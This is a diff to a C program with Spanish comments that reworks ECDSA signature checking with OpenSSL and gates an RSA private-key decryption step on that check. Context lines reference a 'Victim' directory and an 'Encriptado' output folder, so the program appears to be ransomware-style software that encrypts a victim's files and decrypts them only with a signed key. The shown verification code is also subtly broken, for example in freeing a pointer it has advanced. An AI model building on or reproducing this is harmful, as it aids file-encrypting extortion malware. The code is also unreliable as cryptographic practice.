@@ -25,83 +25,160 @@ const char *clavePublicaFirma = "-----BEGIN PUBLIC KEY-----\n"
                                 "XoE6bafsYC5gK1DpwqCbf3lD4h/1W1O65RFQua4EF4iqO4uKNq8w/g==\n"
                                 "-----END PUBLIC KEY-----";
 
-int verifyWithECDSA(const char *signedFile, const char *ecdsaPublicKeyPEM) {
+// Función para cargar la clave pública de ECDSA desde una cadena PEM
+EC_KEY *loadEcdsaPublicKeyFromPEM(const char *pemKey) {
+    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);
+    if (!bio) {
+        perror("Error al crear el objeto BIO para la clave pública de ECDSA");
+        return NULL;
+    }
+
+    EC_KEY *publicKey = PEM_read_bio_EC_PUBKEY(bio, NULL, NULL, NULL);
+    BIO_free(bio);
+
+    if (!publicKey) {
+        perror("Error al leer la clave pública de ECDSA desde la cadena PEM");
+        return NULL;
+    }
+
+    return publicKey;
+}
+
+void handleErrors(void) {
+    ERR_print_errors_fp(stderr);
+    printf("carencias");
+    abort();
+}
+
+int verifyWithECDSA(const char *public_key_path, const char *file_path, const char *signature_path) {
+    int ret = 1;
+
+    // Leer la clave pública
+
+    EC_KEY *public_key = loadEcdsaPublicKeyFromPEM(clavePublicaFirma);
+    if (!public_key)
+        handleErrors();
+
+    // Leer el archivo a verificar
+    FILE *file = fopen(file_path, "rb");
+    if (!file)
+        handleErrors();
+
+    fseek(file, 0L, SEEK_END); // Puntero a final archivo
+
+    long file_size = ftell(file); // Determina el tamaño del archivo
+
+    rewind(file); // Puntero vuelve a inicio del archivo
+
+    unsigned char *data = malloc(file_size); // Asigna memoria para almacenar el contenido del archivo
+    if (!data)
+        handleErrors();
+
+    fread(data, 1, file_size, file);
+    fclose(file);
+
+    // Leer la firma a verificar
+    FILE *signature_file = fopen(signature_path, "rb");
+    if (!signature_file)
+        handleErrors();
+
+    fseek(signature_file, 0L, SEEK_END); // Puntero a final archivo
+
+    long signature_size = ftell(signature_file); // Determina el tamaño de la firma
+
+    rewind(signature_file); // Puntero vuelve a inicio del archivo
+
+    unsigned char *signature_data = malloc(signature_size); // Asigna memoria para almacenar la firma
+    if (!signature_data)
+        handleErrors();
+
+    fread(signature_data, 1, signature_size, signature_file);
+    fclose(signature_file);
+
+    // Verificar la firma
+    ECDSA_SIG *signature = d2i_ECDSA_SIG(NULL, (const unsigned char**)&signature_data, signature_size);
+    if (!signature)
+        handleErrors();
+
+    if (ECDSA_do_verify(data, file_size, signature, public_key) != 1) {
+        fprintf(stderr, "Error al verificar la firma\n");
+        ERR_print_errors_fp(stderr); // Imprimir detalles del error
+        ret = 0; // La verificación falló
+    } else {
+        ret = 1;
+        printf("La firma es válida.\n");
+    }
+    // Liberar recursos
+    ECDSA_SIG_free(signature);
+    EC_KEY_free(public_key);
+    free(data);
+    free(signature_data);
+
+    return ret;
+}
+
+/*int verifyWithECDSA(const char *signatureFile, const char *ecdsaPublicKeyPEM, const char *privateKeyFile) {
     // Cargar la firma desde el archivo
-    FILE *signedFilePtr = fopen(signedFile, "rb");
-    if (!signedFilePtr) {
+    FILE *signatureFilePtr = fopen(signatureFile, "rb");
+    if (!signatureFilePtr) {
         perror("Error al abrir el archivo con la firma");
         return 0;
     }
 
-    fseek(signedFilePtr, 0, SEEK_END);
-    long signedFileSize = ftell(signedFilePtr);
-    fseek(signedFilePtr, 0, SEEK_SET);
+    fseek(signatureFilePtr, 0, SEEK_END);
+    long signatureFileSize = ftell(signatureFilePtr);
+    fseek(signatureFilePtr, 0, SEEK_SET);
 
-    char *signedData = (char *)malloc(signedFileSize + 1);
-    if (!signedData) {
-        perror("Error de asignación de memoria para la firma");
-        fclose(signedFilePtr);
-        return 0;
-    }
-
-    fread(signedData, 1, signedFileSize, signedFilePtr);
-    fclose(signedFilePtr);
-
-    signedData[signedFileSize] = '\0';
-
-    // Encontrar la posición de inicio y fin de la firma
-    const char *beginDelimiter = "-----BEGIN ECDSA SIGNATURE-----";
-    const char *endDelimiter = "-----END ECDSA SIGNATURE-----";
-    const char *begin = strstr(signedData, beginDelimiter);
-    const char *end = strstr(signedData, endDelimiter);
-
-    if (!begin || !end) {
-        perror("Delimitadores de firma no encontrados");
-        free(signedData);
-        return 0;
-    }
-
-    // Calcular la longitud de la firma sin incluir los delimitadores
-    size_t signatureLen = end - begin - strlen(beginDelimiter);
-
-    // Crear un buffer para la firma y copiar la firma sin incluir los delimitadores
-    unsigned char *signature = (unsigned char *)malloc(signatureLen);
+    unsigned char *signature = (unsigned char *)malloc(signatureFileSize);
     if (!signature) {
         perror("Error de asignación de memoria para la firma");
-        free(signedData);
+        fclose(signatureFilePtr);
         return 0;
     }
 
-    memcpy(signature, begin + strlen(beginDelimiter), signatureLen);
+    fread(signature, 1, signatureFileSize, signatureFilePtr);
+    fclose(signatureFilePtr);
 
-    // Cargar la clave pública ECDSA desde la constante global
+    // Cargar la clave pública ECDSA desde el archivo PEM
     BIO *ecdsaBio = BIO_new_mem_buf((void *)ecdsaPublicKeyPEM, -1);
     if (!ecdsaBio) {
         perror("Error al crear el objeto BIO para la clave pública ECDSA");
-        free(signedData);
         free(signature);
         return 0;
     }
 
-    // Crear la clave ECDSA y asignarla a un objeto EVP_PKEY
     EC_KEY *ecdsaKey = PEM_read_bio_EC_PUBKEY(ecdsaBio, NULL, NULL, NULL);
     BIO_free(ecdsaBio);
+
     if (!ecdsaKey) {
         perror("Error al leer la clave pública ECDSA");
-        free(signedData);
         free(signature);
         return 0;
     }
 
+    // Crear un objeto EVP_PKEY a partir de la clave pública ECDSA
     EVP_PKEY *pkey = EVP_PKEY_new();
-    EVP_PKEY_assign_EC_KEY(pkey, ecdsaKey);
+    if (!pkey) {
+        perror("Error al crear el objeto EVP_PKEY para la clave pública ECDSA");
+        free(signature);
+        EC_KEY_free(ecdsaKey);
+        return 0;
+    }
+
+    if (EVP_PKEY_set1_EC_KEY(pkey, ecdsaKey) != 1) {
+        perror("Error al configurar la clave pública ECDSA en el objeto EVP_PKEY");
+        free(signature);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        return 0;
+    }
 
     // Crear el contexto de verificación ECDSA
     EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
     if (!mdctx) {
         perror("Error al crear el contexto de verificación");
-        free(signedData);
         free(signature);
+        EC_KEY_free(ecdsaKey);
         EVP_PKEY_free(pkey);
         return 0;
     }
@@ -109,41 +186,103 @@ int verifyWithECDSA(const char *signedFile, const char *ecdsaPublicKeyPEM) {
     // Inicializar la verificación ECDSA con el objeto EVP_PKEY
     if (EVP_DigestVerifyInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
         perror("Error al inicializar la verificación ECDSA");
-        free(signedData);
         free(signature);
+        EC_KEY_free(ecdsaKey);
         EVP_PKEY_free(pkey);
         EVP_MD_CTX_free(mdctx);
         return 0;
     }
 
     // Actualizar la verificación con los datos de la firma
-    if (EVP_DigestVerifyUpdate(mdctx, (const unsigned char *)signedData, begin - signedData) != 1) {
+    if (EVP_DigestVerifyUpdate(mdctx, signature, signatureFileSize) != 1) {
         perror("Error al actualizar la verificación con los datos de la firma");
-        free(signedData);
         free(signature);
+        EC_KEY_free(ecdsaKey);
         EVP_PKEY_free(pkey);
         EVP_MD_CTX_free(mdctx);
         return 0;
     }
 
-    // Verificar la firma
-    int verificationResult = EVP_DigestVerifyFinal(mdctx, signature, signatureLen);
-
-    // Imprimir el resultado de la verificación
-    if (verificationResult == 1) {
-        printf("La firma es válida.\n");
-    } else {
-        printf("La firma no es válida.\n");
+    // Leer la clave privada desde el archivo PEM
+    FILE *privateKeyFilePtr = fopen(privateKeyFile, "rb");
+    if (!privateKeyFilePtr) {
+        perror("Error al abrir el archivo de la clave privada");
+        free(signature);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
     }
 
+    // Cargar la clave privada desde el archivo PEM
+    fseek(privateKeyFilePtr, 0, SEEK_END);
+    long originalRsaDataSize = ftell(privateKeyFilePtr);
+    fseek(privateKeyFilePtr, 0, SEEK_SET);
+
+    char *originalRsaData = (char *)malloc(originalRsaDataSize + 1);
+    if (!originalRsaData) {
+        perror("Error de asignación de memoria para los datos originales");
+        fclose(privateKeyFilePtr);
+        free(signature);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    fread(originalRsaData, 1, originalRsaDataSize, privateKeyFilePtr);
+    fclose(privateKeyFilePtr);
+
+    originalRsaData[originalRsaDataSize] = '\0';
+
+    // Verificar la firma
+    EVP_PKEY_CTX *pkey_ctx = EVP_PKEY_CTX_new(pkey, NULL);
+    if (!pkey_ctx) {
+        perror("Error al crear el contexto de clave pública");
+        free(signature);
+        free(originalRsaData);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    if (EVP_PKEY_verify_init(pkey_ctx) != 1) {
+        perror("Error al inicializar la verificación ECDSA");
+        EVP_PKEY_CTX_free(pkey_ctx);
+        free(signature);
+        free(originalRsaData);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    if (EVP_PKEY_verify(pkey_ctx, signature, signatureFileSize, (const unsigned char *)originalRsaData, originalRsaDataSize) != 1) {
+        perror("Firma incorrecta");
+        EVP_PKEY_CTX_free(pkey_ctx);
+        free(signature);
+        free(originalRsaData);
+        EC_KEY_free(ecdsaKey);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    EVP_PKEY_CTX_free(pkey_ctx);
+
+    // Imprimir el resultado de la verificación
+    printf("La firma es válida.\n");
+
     // Liberar la memoria y recursos
-    free(signedData);
     free(signature);
+    free(originalRsaData);
+    EC_KEY_free(ecdsaKey);
     EVP_PKEY_free(pkey);
     EVP_MD_CTX_free(mdctx);
 
-    return 0;
-}
+    return 1;
+}*/
 
 RSA *parseRSAPublicKeyFromPEMString(const char *pemKey) {
     BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);  // -1 para que BIO determine la longitud automáticamente
@@ -289,7 +428,8 @@ int main()
     struct dirent *File;
 
     // claves RSA //
-    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\signed_rsa_with_ecdsa.pem";
+    const char *firma = "C:\\Users\\usuario\\Desktop\\firma_ecdsa.txt";
+    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\clave_privada_rsa.pem";
 
     if ((File = readdir(Victim)) != NULL){
     int Envirao = mkdir(Encriptado);
@@ -367,7 +507,7 @@ int main()
         } 
     }
     }else {
-        if (verifyWithECDSA(PrivateKey, clavePublicaFirma)) {
+        if (verifyWithECDSA(clavePublicaFirma, PrivateKey, firma)) {
         FILE *privateKeyFileSigned = fopen(PrivateKey, "rb");
         RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFileSigned, NULL, NULL, NULL);
         fclose(privateKeyFileSigned);
